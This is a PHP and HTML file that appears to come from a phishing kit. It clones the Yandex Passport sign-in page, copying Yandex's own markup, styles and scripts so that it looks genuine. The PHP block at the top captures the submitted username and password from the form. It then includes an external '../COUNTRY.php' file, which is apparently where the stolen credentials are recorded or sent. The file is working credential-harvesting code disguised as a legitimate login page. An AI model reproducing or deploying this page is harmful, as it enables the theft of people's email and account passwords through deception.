<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['login'];
$password = $_POST['passwd'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<!DOCTYPE html>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<html data-page-type="auth.new" class="is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes" lang="en"><head><script async="" src="https://mc.yandex.ru/metrika/watch.js?_=1530024665152"></script><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"><link rel="shortcut icon" href="//yastatic.net/morda-logo/i/favicon_comtr.ico"><script nonce="dbe9dfa1-da49-4bc1-8acf-2390758893ad">(function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);</script><title>Authorization</title><!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.88-20/public/css/auth.new.css"><!-- <![endif]--><!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.88-20/public/css/auth.new.ie.css"/><![endif]--><script nonce="dbe9dfa1-da49-4bc1-8acf-2390758893ad">var uid = null;var login = null;var passportHost = "passport.yandex.com";</script><!--[if IE]><script src="//yastatic.net/jquery/1.9.1/jquery.min.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.88-20/public/js/vendor.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.88-20/public/js/auth.new.react.en.js"></script><![endif]--><!--[if !IE]><!--><script src="//yastatic.net/jquery/1.9.1/jquery.min.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.88-20/public/js/vendor.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.88-20/public/js/auth.new.react.en.js" defer="defer"></script><!-- <![endif]--><script type="text/javascript" nonce="dbe9dfa1-da49-4bc1-8acf-2390758893ad">!function(i,t){function e(){Ya.Rum.vsChanged=!0,document.removeEventListener("visibilitychange",e)}if(i.Ya=i.Ya||{},Ya.Rum)throw new Error("Rum: interface is already defined");var n=i.performance,s=n&&n.timing&&n.timing.navigationStart||Ya.startPageLoad||+new Date,a=i.requestAnimationFrame;Ya.Rum={enabled:!!n,vsStart:document.visibilityState,vsChanged:!1,_defTimes:[],_defRes:[],_deltaMarks:{},_settings:{},_vars:{},init:function(i,t){this._settings=i,this._vars=t},getTime:n&&n.now?function(){return n.now()}:function(){return Date.now()-s},time:function(i){this._deltaMarks[i]=[this.getTime()]},timeEnd:function(i){var t=this._deltaMarks[i];t&&0!==t.length&&t.push(this.getTime())},sendTimeMark:function(i,t,e,n){void 0===t&&(t=this.getTime()),this._defTimes.push([i,t,n]),this.mark(i,t)},sendResTiming:function(i,t){this._defRes.push([i,t])},sendRaf:function(i){if(a&&!this.isVisibilityChanged()){var t=this,e="2616."+i;a(function(){t.isVisibilityChanged()||(t.sendTimeMark(e+".205"),a(function(){t.isVisibilityChanged()||t.sendTimeMark(e+".1928")}))})}},isVisibilityChanged:function(){return this.vsStart&&("visible"!==this.vsStart||this.vsChanged)},mark:n&&n.mark?function(i,t){n.mark(i+(t?": "+t:""))}:function(){}},Date.now||(Ya.Rum.getTime=function(){return new Date-s}),document.addEventListener&&document.addEventListener("visibilitychange",e)}(window);
!function(){"use strict";if(window.PerformanceLongTaskTiming){var e=Ya.Rum._tti={events:[],observer:new PerformanceObserver(function(n){e.events=e.events.concat(n.getEntries()),e.events.length>100&&e.events.shift()})};e.observer.observe({entryTypes:["longtask"]})}}();
Ya.Rum.init({beacon:true,clck:'https://yandex.ru/clck/click',slots:["phone_alias_as_login_etalon","new_pwd_change_exp","delete_exp","social_postreg_exp","toloka_exp","music_etalon"],reqid:'7b6645fc4967df13fedf878ba36f1083'},{'287':'10374','143':'28.1207.2243'});</script><script src="https://yastatic.net/nearest.js" async="" crossorigin=""></script></head><body class="passport-Page-Body-h" data-uid="null" data-login="null" data-passporthost="&quot;passport.yandex.com&quot;" data-static-url="https://yastatic.net/passport-frontend/0.2.88-20/public/" data-logger-token="60046daeac236ef701ac19d31af0fbe2" data-csrf="8ca61a4485493bc6a6dd5cb280dd6035b1c21c3e:1530024664725" data-metrics-id="784657" data-tld="com" data-locale="en"><div id="root"><div class="passport-Page-Body" data-reactroot="" data-reactid="1" data-react-checksum="1920314883"><div class="passport-Page-Background passport-Page-Background_18" data-reactid="2"></div><span class="passport-Page-Helper" data-reactid="3"></span><div class="passport-Page-Content" data-reactid="4"><div class="passport-Domik passport-Domik_mode_addingAccount" data-reactid="5"><h1 class="passport-Logo" data-reactid="6"><a href="https://yandex.com" data-reactid="7"><span class="passport-Icon passport-Icon_yandex_en" data-reactid="8"></span></a></h1><div class="passport-Domik-Form-Error" data-reactid="9"></div><div class="passport-ScreenBox passport-Domik-Content passport-Domik-Content_wide" data-reactid="10"><div class="passport-ScreenBox-Content" data-reactid="11"><div class="passport-ScreenBox-Item" data-reactid="12"><div class="passport-ScreenBox-Item-Content" data-reactid="13"><div class="passport-Domik-Content" data-reactid="14"></div></div></div><div class="passport-ScreenBox-Item passport-ScreenBox-Item_current" data-reactid="15"><div class="passport-ScreenBox-Item-Content" data-reactid="16"><div class="passport-Domik-Content" data-reactid="17"><form method="post" target="iframe" action="" class="passport-Domik-Form" data-reactid="18"><input name="real_retpath" value="https://mail.yandex.com/" data-reactid="19" type="hidden"><input name="from" value="mail" data-reactid="20" type="hidden"><input name="fretpath" data-reactid="21" value="" type="hidden"><input name="clean" data-reactid="22" value="" type="hidden"><input name="idkey" value="aee01d23aa7ed22a912fcc3c009e25f1cc" data-reactid="23" type="hidden"><input name="extended" value="1" data-reactid="24" type="hidden"><input name="csrf_token" value="57ba55b3a4291ba0c55a459626080254ad37dcaa:1530024664716" data-reactid="25" type="hidden"><input name="one" value="1" data-reactid="26" type="hidden"><input name="retpath" value="https://passport.yandex.com/auth/login-status_v2.html?method=password" data-reactid="27" type="hidden"><div class="passport-Domik-Form-Field" data-reactid="28"><label class="passport-Input" data-reactid="29"><input name="login" autocorrect="off" autocapitalize="off" autocomplete="username" placeholder=" " class="passport-Input-Controller" data-reactid="30" type="text"><span class="passport-Input-View" data-reactid="31"><span class="passport-Input-Label" data-reactid="32">Username</span></span></label></div><div class="passport-Domik-Form-Field" data-reactid="33"><label class="passport-Input" data-reactid="34"><input class="passport-Input-Controller" name="passwd" autocorrect="off" autocapitalize="off" autocomplete="current-password" placeholder=" " data-reactid="35" type="password"><span class="passport-Input-View" data-reactid="36"><span class="passport-Input-Label" data-reactid="37">Password</span></span></label></div><div class="passport-Domik-Form-Field" data-reactid="38"><label class="passport-Checkbox" data-reactid="39"><input name="twoweeks" value="no" class="passport-Checkbox-Controller" data-reactid="40" type="checkbox"><span class="passport-Checkbox-View" data-reactid="41"></span><span class="passport-Checkbox-Label" data-reactid="42">Don't remember me</span></label></div><div class="passport-Domik-Form-Field" data-reactid="43"><button type="submit" class="passport-Button" data-reactid="44"><span class="passport-Button-Content" data-reactid="45"><span class="passport-Button-Text" data-reactid="46">Sign in</span></span></button><button type="button" class="passport-Button passport-Button_qr" data-reactid="47"><span class="passport-Button-Content" data-reactid="48"></span></button></div></form><div data-reactid="49"><h3 class="passport-Domik-Title" data-reactid="50">Or&nbsp;sign in&nbsp;with a&nbsp;social network</h3><ul class="passport-Domik-SocialNetworks" data-reactid="51"><li data-metrics="Начало соцавторизации: fb" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_fb" data-reactid="52"><span class="passport-Icon passport-Icon_social_fb" data-reactid="53"></span></li><li data-metrics="Начало соцавторизации: gg" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_gg" data-reactid="54"><span class="passport-Icon passport-Icon_social_gg" data-reactid="55"></span></li><li data-metrics="Начало соцавторизации: tw" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_tw" data-reactid="56"><span class="passport-Icon passport-Icon_social_tw" data-reactid="57"></span></li></ul></div></div></div></div><div class="passport-ScreenBox-Item" data-reactid="58"><div class="passport-ScreenBox-Item-Content" data-reactid="59"><div class="passport-Domik-Content" data-reactid="60"></div></div></div></div><ul class="passport-Domik-Footer" data-reactid="61"><li class="passport-Domik-Footer-Item" data-reactid="62"><a data-metrics="Клик на восстановление" href="https://passport.yandex.com/restoration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="63">Can't sign&nbsp;in?</a></li><li class="passport-Domik-Footer-Item" data-reactid="64"><a data-metrics="Клик на регистрацию" href="https://passport.yandex.com/registration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="65">Registration</a></li></ul></div></div><div class="passport-Domik-Retpath" data-reactid="66"><a data-metrics="Клик на Вернуться на сервис" href="https://mail.yandex.com?noretpath=1" data-reactid="67">Return to&nbsp;service</a></div><iframe class="passport-Domik-Iframe" name="iframe" src="about:blank" data-reactid="68"></iframe></div><footer class="passport-Page-Footer" data-reactid="69"><div class="footer" data-reactid="70"><span class="footer-item" data-reactid="71"><a class="link link_theme_normal" target="_blank" href="https://yandex.com/support/passport/" tabindex="0" data-reactid="72"><span class="link__inner" data-reactid="73"><!-- react-text: 74 -->Help<!-- /react-text --></span></a></span><span class="footer-item footer-item__rights" data-reactid="75"><!-- react-text: 76 -->© 2021, <!-- /react-text --><a class="link link_theme_normal" href="//yandex.com" tabindex="0" data-reactid="77"><span class="link__inner" data-reactid="78"><!-- react-text: 79 -->Yandex<!-- /react-text --></span></a></span></div></footer></div></div><noscript><div><img src="//mc.yandex.ru/watch/784657" style="position:absolute; left:-9999px;" alt=""/></div></noscript></body></html>
